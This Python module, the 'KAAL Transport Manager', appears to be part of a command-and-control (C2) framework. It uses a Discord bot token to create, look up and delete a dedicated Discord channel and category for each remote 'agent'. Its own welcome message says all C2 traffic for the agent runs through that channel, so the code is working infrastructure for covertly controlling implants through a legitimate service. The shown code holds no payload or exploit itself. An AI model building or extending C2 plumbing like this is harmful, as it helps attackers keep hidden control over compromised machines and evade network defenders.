"""
KAAL Transport Manager — Abstracts transport layer for agent communication.
Supports per-agent Discord channel creation for isolation and scalability.
"""
import logging
import aiohttp
from typing import Dict, Optional, Any

log = logging.getLogger("kaal.transport")


class TransportManager:
    """Manages transport-specific operations like per-agent channel creation."""

    DISCORD_API = "https://discord.com/api/v10"

    def __init__(self):
        self.bot_token: Optional[str] = None
        self.guild_id: Optional[str] = None
        self.category_id: Optional[str] = None  # Category under which agent channels go
        self.default_channel_id: Optional[str] = None  # Shared fallback channel
        self._session: Optional[aiohttp.ClientSession] = None

    def configure(self, bot_token: str, guild_id: str,
                  default_channel_id: str, category_id: Optional[str] = None):
        """Configure with Discord credentials."""
        self.bot_token = bot_token
        self.guild_id = guild_id
        self.default_channel_id = default_channel_id
        self.category_id = category_id
        log.info(f"TransportManager configured: guild={guild_id}, "
                 f"default_channel={default_channel_id}, category={category_id}")

    async def _get_session(self) -> aiohttp.ClientSession:
        if not self._session or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    # ──────── Discord Channel Operations ────────

    async def create_agent_channel(self, agent_id: str,
                                    agent_platform: str = "unknown") -> Optional[str]:
        """Create a dedicated Discord text channel for an agent.

        Returns the new channel ID, or None on failure.
        """
        if not self.bot_token or not self.guild_id:
            log.warning("TransportManager not configured, cannot create channel")
            return None

        session = await self._get_session()
        short_id = agent_id[:12].replace("-", "")
        channel_name = f"agent-{short_id}"

        headers = {
            "Authorization": f"Bot {self.bot_token}",
            "Content-Type": "application/json"
        }

        payload: Dict[str, Any] = {
            "name": channel_name,
            "type": 0,  # Text channel
            "topic": f"KAAL Agent {agent_id} | Platform: {agent_platform}",
        }

        # Put under category if configured
        if self.category_id:
            payload["parent_id"] = self.category_id

        url = f"{self.DISCORD_API}/guilds/{self.guild_id}/channels"

        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 201:
                    data = await resp.json()
                    channel_id = data["id"]
                    log.info(f"Created Discord channel #{channel_name} "
                             f"(ID: {channel_id}) for agent {agent_id}")

                    # Send welcome message
                    msg_url = f"{self.DISCORD_API}/channels/{channel_id}/messages"
                    welcome = (f"🔗 **Agent Connected**\n"
                               f"```\nAgent ID : {agent_id}\n"
                               f"Platform : {agent_platform}\n"
                               f"Channel  : #{channel_name}\n```\n"
                               f"All C2 traffic for this agent will use this channel.")
                    await session.post(msg_url, json={"content": welcome},
                                       headers=headers)
                    return channel_id

                elif resp.status == 429:
                    data = await resp.json()
                    retry = data.get("retry_after", 5)
                    log.warning(f"Rate limited creating channel, retry after {retry}s")
                    return None
                else:
                    text = await resp.text()
                    log.error(f"Failed to create channel: HTTP {resp.status}: {text}")
                    return None
        except Exception as e:
            log.error(f"Channel creation error: {e}")
            return None

    async def delete_agent_channel(self, channel_id: str) -> bool:
        """Delete a per-agent Discord channel (cleanup)."""
        if not self.bot_token:
            return False

        session = await self._get_session()
        headers = {"Authorization": f"Bot {self.bot_token}"}
        url = f"{self.DISCORD_API}/channels/{channel_id}"

        try:
            async with session.delete(url, headers=headers) as resp:
                if resp.status in (200, 204):
                    log.info(f"Deleted Discord channel {channel_id}")
                    return True
                log.error(f"Failed to delete channel {channel_id}: HTTP {resp.status}")
                return False
        except Exception as e:
            log.error(f"Channel deletion error: {e}")
            return False

    async def ensure_category(self, category_name: str = "KAAL-Agents") -> Optional[str]:
        """Create or find the KAAL agents category in the guild.

        Returns the category channel ID.
        """
        if not self.bot_token or not self.guild_id:
            return None

        session = await self._get_session()
        headers = {"Authorization": f"Bot {self.bot_token}"}

        # List existing channels to find category
        url = f"{self.DISCORD_API}/guilds/{self.guild_id}/channels"
        try:
            async with session.get(url, headers=headers) as resp:
                if resp.status != 200:
                    return None
                channels = await resp.json()
                for ch in channels:
                    if ch.get("type") == 4 and ch.get("name") == category_name.lower():
                        self.category_id = ch["id"]
                        log.info(f"Found existing category '{category_name}' "
                                 f"(ID: {self.category_id})")
                        return self.category_id
        except Exception as e:
            log.error(f"Error listing channels: {e}")
            return None

        # Create category
        payload = {
            "name": category_name,
            "type": 4  # Category
        }
        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 201:
                    data = await resp.json()
                    self.category_id = data["id"]
                    log.info(f"Created category '{category_name}' "
                             f"(ID: {self.category_id})")
                    return self.category_id
                log.error(f"Failed to create category: HTTP {resp.status}")
                return None
        except Exception as e:
            log.error(f"Category creation error: {e}")
            return None

    def get_channel_for_agent(self, agent_id: str,
                               agent_channels: Dict[str, str]) -> str:
        """Get the channel ID for an agent (per-agent or fallback to default).

        agent_channels: dict mapping agent_id -> channel_id (from DB).
        """
        return agent_channels.get(agent_id, self.default_channel_id or "")


# Singleton
transport_manager = TransportManager()
